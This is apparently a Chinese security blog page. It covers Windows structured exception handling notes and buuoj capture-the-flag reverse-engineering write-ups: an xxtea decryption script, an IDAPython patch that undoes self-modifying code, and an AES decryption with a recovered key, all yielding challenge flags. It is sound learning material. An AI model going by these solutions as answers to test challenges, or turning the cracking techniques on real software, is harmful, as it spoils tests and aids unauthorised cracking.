<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">FirstSEHer</span><span class="params">( PEXCEPTION_POINTERS pExcepInfo )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR* pTitle = _T(<span class="string">&quot;第一个SEH处理器&quot;</span>);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][1] in \n&quot;</span>) );</span><br><span class="line">    LONG nRet = ShowSelectMessageBox(pTitle);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][1] out \n&quot;</span>) );</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LONG <span class="title">SecondSEHer</span><span class="params">( PEXCEPTION_POINTERS pExcepInfo )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR* pTitle = _T(<span class="string">&quot;第二个SEH处理器&quot;</span>);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][2] in \n&quot;</span>) );</span><br><span class="line">    LONG nRet = ShowSelectMessageBox(pTitle);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][2] out \n&quot;</span>) );;</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExcepFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        __try</span><br><span class="line">        &#123;</span><br><span class="line">            __try</span><br><span class="line">            &#123;</span><br><span class="line"> </span><br><span class="line">                _tprintf( _T(<span class="string">&quot;[EH.Exe] *[CALL] int 3\n&quot;</span>) );</span><br><span class="line">                __asm <span class="keyword">int</span> <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            __finally</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>( <span class="string">&quot;[EH.Exe] *[SEH][0] finally call...\n&quot;</span> );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        __except( FirstSEHer(GetExceptionInformation()) )</span><br><span class="line">        &#123;</span><br><span class="line">            _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][1] 被俺处理了~(只有返回EXCEPTION_EXECUTE_HANDLER才会走到这里)\n&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except( SecondSEHer(GetExceptionInformation()) )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][2] 被俺处理了(只有返回EXCEPTION_EXECUTE_HANDLER才会走到这里)\n&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="执行TopLevelEH"><a href="#执行TopLevelEH" class="headerlink" title="执行TopLevelEH"></a>执行TopLevelEH</h3><p>利用SEH实现，但是可以处理所有线程抛出的异常。如果正在被调试，则顶层异常会被忽略。</p>
<p>返回值：</p>
<ul>
<li><p>EXCEPTION_CONTINUE_SEARCH</p>
<p>查注册表，如果存在调试器，则抛给调试器</p>
<p>注册表路径：KLM\software\microsoft\windows nt\currentvsrsion\aedebug。如果Auto==1，Debugger!=NULL</p>
</li>
<li><p>EXCEPTION_EXECUTE_HANDLER</p>
<p>杀死该进程</p>
</li>
<li><p>EXCEPTION_CONTINUE_EXECUTION</p>
<p>和SEH一样</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG NTAPI <span class="title">TopLevelExcepFilter</span><span class="params">( PEXCEPTION_POINTERS pExcepInfo )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR* pTitle = _T(<span class="string">&quot;*顶级* 异常处理器&quot;</span>);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [TOP] in \n&quot;</span>) );</span><br><span class="line">    LONG nRet = ShowSelectMessageBox(pTitle);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [TOP] out \n&quot;</span>) );;</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注册</span></span><br><span class="line">SetUnhandledExceptionFilter( &amp;TopLevelExcepFilter );</span><br></pre></td></tr></table></figure>
<h3 id="再次交给调试器"><a href="#再次交给调试器" class="headerlink" title="再次交给调试器"></a>再次交给调试器</h3><p>返回值</p>
<ul>
<li><p>DBG_CONTINUE</p>
<p>和第一次相同</p>
</li>
<li><p>DBG_EXCEPTION_NOT_HANDLED</p>
<p>直接杀死进程</p>
</li>
</ul>
<h3 id="调试异常端口通知csrss-exe"><a href="#调试异常端口通知csrss-exe" class="headerlink" title="调试异常端口通知csrss.exe"></a>调试异常端口通知csrss.exe</h3><p>上面的异常处理机制都没有处理该异常，则调用csrss.exe，弹出一个对话框</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-173853.htm">[原创]白话windows之四 异常处理机制(VEH、SEH、TopLevelEH…)</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/rev/ehs" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/27/note/rev/ehs/" class="article-date">
  	<time datetime="2020-10-27T11:01:03.000Z" itemprop="datePublished">2020-10-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/27/note/rev/ehs/">
        Windows异常处理机制
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-writeup/buuoj/wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/22/writeup/buuoj/wp/" class="article-date">
  	<time datetime="2020-10-22T02:07:17.000Z" itemprop="datePublished">2020-10-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/22/writeup/buuoj/wp/">
        buuoj writeup
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这篇博客记录buuoj上面刷题时学到东西题</p>
<h2 id="rev-红帽杯2019-xx"><a href="#rev-红帽杯2019-xx" class="headerlink" title="[rev][红帽杯2019]xx"></a>[rev][红帽杯2019]xx</h2><p>找main函数：</p>
<ol>
<li><p>有三个参数，也可能两个</p>
</li>
<li><p>下面有个函数使用了main函数的返回值</p>
</li>
</ol>
<p>根据这两个特点</p>
<p>sub1400020F中的这段代码值得注意</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    register_thread_local_exe_atexit_callback(*v12);</span><br><span class="line">  get_initial_narrow_environment(v11);</span><br><span class="line">  v14 = *(_QWORD *)_p___argv(v13);</span><br><span class="line">  v16 = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)_p___argc(v15);</span><br><span class="line">  a1 = sub_1400011A0(*v16, v14);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)sub_140002790(v17) )</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">exit</span>(a1);</span><br></pre></td></tr></table></figure>
<p>可以看出sub_140011A0就是main</p>
<p>进入main函数分析</p>
<ol>
<li><p>最后检测逻辑</p>
<p>对某个数组进行置换并且置换之后进行了异或</p>
</li>
<li><p>再往前的变换逻辑</p>
<p>用户输入被送进了一个函数，返回值用来做检测</p>
</li>
<li><p>进入那个函数</p>
<p>看起来像tea加密(0x9E3779B9)</p>
<p>想起来加密与解密中介绍了tea的变种，网上搜索，发现是xxtea加密</p>
</li>
</ol>
<p>解密脚本</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &quot;defs.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> align4(x) (((x)&amp;3)?(x&gt;&gt;2):((x&gt;&gt;2)+1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X,&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p&lt;n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxTeaDecrypt</span><span class="params">(<span class="keyword">uint8_t</span> *cdata,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> data[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(data,cdata,<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> key[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    key[<span class="number">0</span>] = <span class="string">&#x27;f&#x27;</span>+(<span class="string">&#x27;l&#x27;</span>&lt;&lt;<span class="number">8</span>)+(<span class="string">&#x27;a&#x27;</span>&lt;&lt;<span class="number">16</span>)+(<span class="string">&#x27;g&#x27;</span>&lt;&lt;<span class="number">24</span>);</span><br><span class="line">    printArray(<span class="string">&quot;key&quot;</span>,(<span class="keyword">uint8_t</span>*)key,<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    btea(data,<span class="number">-6</span>,key);</span><br><span class="line">    printArray(<span class="string">&quot;cdata&quot;</span>,(<span class="keyword">uint8_t</span> *)cdata,<span class="number">0x18</span>);</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,(<span class="keyword">uint8_t</span>*)data,<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> buf[<span class="number">0x18</span>];</span><br><span class="line">    *(<span class="keyword">int64_t</span> *)&amp;buf[<span class="number">0</span>]=<span class="number">0xC0953A7C6B40BCCE</span>LL;</span><br><span class="line">    *(<span class="keyword">int64_t</span> *)&amp;buf[<span class="number">8</span>]=<span class="number">0x3502F79120209BEF</span>LL;</span><br><span class="line">    *(<span class="keyword">int32_t</span> *)&amp;buf[<span class="number">16</span>]=<span class="number">0xC8021823</span>;</span><br><span class="line">    *(<span class="keyword">int32_t</span> *)&amp;buf[<span class="number">20</span>]=<span class="number">0xFA5656E7</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> cipher[<span class="number">0x18</span>];</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * v20=0,1,2</span></span><br><span class="line"><span class="comment">    * v20=3,4,5 buf[3,4,5]^=buf[0]^buf[1]</span></span><br><span class="line"><span class="comment">    * v20=6,7,8 buf[6,7,8]^=buf[0]^buf[1]^buf[2]</span></span><br><span class="line"><span class="comment">    * v20=9,10,11 buf[9,10,11]^=buf[0]^buf[1]^buf[2]^buf[3]</span></span><br><span class="line"><span class="comment">    * ...</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0x18</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i/<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">uint8_t</span> j=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                buf[i]^=buf[j];</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">while</span>(j&lt;i/<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cipher[<span class="number">2</span>]=buf[<span class="number">0</span>];</span><br><span class="line">    cipher[<span class="number">0</span>]=buf[<span class="number">1</span>];</span><br><span class="line">    cipher[<span class="number">3</span>]=buf[<span class="number">2</span>];</span><br><span class="line">    cipher[<span class="number">1</span>]=buf[<span class="number">3</span>];</span><br><span class="line">    cipher[<span class="number">6</span>]=buf[<span class="number">4</span>];</span><br><span class="line">    cipher[<span class="number">4</span>]=buf[<span class="number">5</span>];</span><br><span class="line">    cipher[<span class="number">7</span>]=buf[<span class="number">6</span>];</span><br><span class="line">    cipher[<span class="number">5</span>]=buf[<span class="number">7</span>];</span><br><span class="line">    cipher[<span class="number">10</span>]=buf[<span class="number">8</span>];</span><br><span class="line">    cipher[<span class="number">8</span>]=buf[<span class="number">9</span>];</span><br><span class="line">    cipher[<span class="number">11</span>]=buf[<span class="number">10</span>];</span><br><span class="line">    cipher[<span class="number">9</span>]=buf[<span class="number">11</span>];</span><br><span class="line">    cipher[<span class="number">14</span>]=buf[<span class="number">12</span>];</span><br><span class="line">    cipher[<span class="number">12</span>]=buf[<span class="number">13</span>];</span><br><span class="line">    cipher[<span class="number">15</span>]=buf[<span class="number">14</span>];</span><br><span class="line">    cipher[<span class="number">13</span>]=buf[<span class="number">15</span>];</span><br><span class="line">    cipher[<span class="number">18</span>]=buf[<span class="number">16</span>];</span><br><span class="line">    cipher[<span class="number">16</span>]=buf[<span class="number">17</span>];</span><br><span class="line">    cipher[<span class="number">19</span>]=buf[<span class="number">18</span>];</span><br><span class="line">    cipher[<span class="number">17</span>]=buf[<span class="number">19</span>];</span><br><span class="line">    cipher[<span class="number">22</span>]=buf[<span class="number">20</span>];</span><br><span class="line">    cipher[<span class="number">20</span>]=buf[<span class="number">21</span>];</span><br><span class="line">    cipher[<span class="number">23</span>]=buf[<span class="number">22</span>];</span><br><span class="line">    cipher[<span class="number">21</span>]=buf[<span class="number">23</span>];</span><br><span class="line">    <span class="comment">// printArray(&quot;cipher&quot;,cipher,0x18);</span></span><br><span class="line">    xxTeaDecrypt(cipher,<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code class="lang-flag&#123;CXX_and_++tea&#125;```">
## [rev][GWCTF 2019]re3

1. 进入main函数，发现mprotect和SMC(自修改代码)逻辑，使用idapython进行patch

   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">st=<span class="number">0x402219</span></span><br><span class="line">end=st+<span class="number">223</span></span><br><span class="line"><span class="keyword">while</span> st&lt;=end:</span><br><span class="line">    c=Byte(st)</span><br><span class="line">    PatchByte(st,(c^<span class="number">0x99</span>))</span><br><span class="line">    st+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

2. 进入sub_402219，找到比对逻辑

   0xbc 0xa 0xad 0xc0 0x14 0x7c 0x5e 0xcc 0xe0 0xb1 0x40 0xbc 0x9c 0x51 0xd5 0x2b 0x46 0xb2 0xb9 0x43 0x4d 0xe5 0x32 0x4b 0xad 0x7f 0xb4 0xb3 0x9c 0xdb 0x4b 0x5b

3. 重点在于sub_40196E

   这里用到了一个全局变量unk_603170

   1. sub_400B0A逐字节异或从0开始，共16轮

   2. 进行替换，替换表为byte_4023A0

      0x63 0x7c 0x77 0x7b 0xf2 0x6b 0x6f 0xc5 0x30 0x1 0x67 0x2b 0xfe 0xd7 0xab 0x76 0xca 0x82 0xc9 0x7d 0xfa 0x59 0x47 0xf0 0xad 0xd4 0xa2 0xaf 0x9c 0xa4 0x72 0xc0 0xb7 0xfd 0x93 0x26 0x36 0x3f 0xf7 0xcc 0x34 0xa5 0xe5 0xf1 0x71 0xd8 0x31 0x15 0x4 0xc7 0x23 0xc3 0x18 0x96 0x5 0x9a 0x7 0x12 0x80 0xe2 0xeb 0x27 0xb2 0x75 0x9 0x83 0x2c 0x1a 0x1b 0x6e 0x5a 0xa0 0x52 0x3b 0xd6 0xb3 0x29 0xe3 0x2f 0x84 0x53 0xd1 0x0 0xed 0x20 0xfc 0xb1 0x5b 0x6a 0xcb 0xbe 0x39 0x4a 0x4c 0x58 0xcf 0xd0 0xef 0xaa 0xfb 0x43 0x4d 0x33 0x85 0x45 0xf9 0x2 0x7f 0x50 0x3c 0x9f 0xa8 0x51 0xa3 0x40 0x8f 0x92 0x9d 0x38 0xf5 0xbc 0xb6 0xda 0x21 0x10 0xff 0xf3 0xd2 0xcd 0xc 0x13 0xec 0x5f 0x97 0x44 0x17 0xc4 0xa7 0x7e 0x3d 0x64 0x5d 0x19 0x73 0x60 0x81 0x4f 0xdc 0x22 0x2a 0x90 0x88 0x46 0xee 0xb8 0x14 0xde 0x5e 0xb 0xdb 0xe0 0x32 0x3a 0xa 0x49 0x6 0x24 0x5c 0xc2 0xd3 0xac 0x62 0x91 0x95 0xe4 0x79 0xe7 0xc8 0x37 0x6d 0x8d 0xd5 0x4e 0xa9 0x6c 0x56 0xf4 0xea 0x65 0x7a 0xae 0x8 0xba 0x78 0x25 0x2e 0x1c 0xa6 0xb4 0xc6 0xe8 0xdd 0x74 0x1f 0x4b 0xbd 0x8b 0x8a 0x70 0x3e 0xb5 0x66 0x48 0x3 0xf6 0xe 0x61 0x35 0x57 0xb9 0x86 0xc1 0x1d 0x9e 0xe1 0xf8 0x98 0x11 0x69 0xd9 0x8e 0x94 0x9b 0x1e 0x87 0xe9 0xce 0x55 0x28 0xdf 0x8c 0xa1 0x89 0xd 0xbf 0xe6 0x42 0x68 0x41 0x99 0x2d 0xf 0xb0 0x54 0xbb 0x16

   3. sub_400C1F进行置换 置换表

      [0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12, 1, 6, 11]

   4. sub_400D27自异或操作

      v1=s[i*4]

      v2=s[i*4+1]^s[i*4+2]^s[i*4+3]

      sub_400CFA 2*x^27\*(x&gt;&gt;7)

      s[i*4]=v2^sub_400CFA(s[i*4]^s[i*4+1])

      s[i*4+1]=v2^sub_400CFA(+1,+2)

      s[2]=v2^sub(+2,+3)

      s[3]=v2^sub(+3)

   5. 再进行异或

   6. 循环结束，9轮

   7. 替换

   8. 置换

   9. 异或

   看下来是AES加密算法，555我爬了

   ECB模式，密钥可以调试获得

   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0xcb</span>,<span class="number">0x8d</span>,<span class="number">0x49</span>,<span class="number">0x35</span>,<span class="number">0x21</span>,<span class="number">0xb4</span>,<span class="number">0x7a</span>,<span class="number">0x4c</span>,<span class="number">0xc1</span>,<span class="number">0xae</span>,<span class="number">0x7e</span>,<span class="number">0x62</span>,<span class="number">0x22</span>,<span class="number">0x92</span>,<span class="number">0x66</span>,<span class="number">0xce</span>]</span><br><span class="line">key = bytes(key)</span><br><span class="line">cipher = [<span class="number">0xbc</span>,<span class="number">0xa</span>,<span class="number">0xad</span>,<span class="number">0xc0</span>,<span class="number">0x14</span>,<span class="number">0x7c</span>,<span class="number">0x5e</span>,<span class="number">0xcc</span>,<span class="number">0xe0</span>,<span class="number">0xb1</span>,<span class="number">0x40</span>,<span class="number">0xbc</span>,<span class="number">0x9c</span>,<span class="number">0x51</span>,<span class="number">0xd5</span>,<span class="number">0x2b</span>,<span class="number">0x46</span>,<span class="number">0xb2</span>,<span class="number">0xb9</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0xe5</span>,<span class="number">0x32</span>,<span class="number">0x4b</span>,<span class="number">0xad</span>,<span class="number">0x7f</span>,<span class="number">0xb4</span>,<span class="number">0xb3</span>,<span class="number">0x9c</span>,<span class="number">0xdb</span>,<span class="number">0x4b</span>,<span class="number">0x5b</span>]</span><br><span class="line">cipher = bytes(cipher)</span><br><span class="line">aes = AES.new(mode=AES.MODE_ECB,key=key)</span><br><span class="line">print(aes.decrypt(cipher))</span><br></pre></td></tr></table></figure>

## [rev][ACTF新生赛2020]Oruga

迷宫问题

规则：

1. WEMJ分别代表上右下左

2. 如果上次的方向是上，这次还是上，则改为右，以此类推

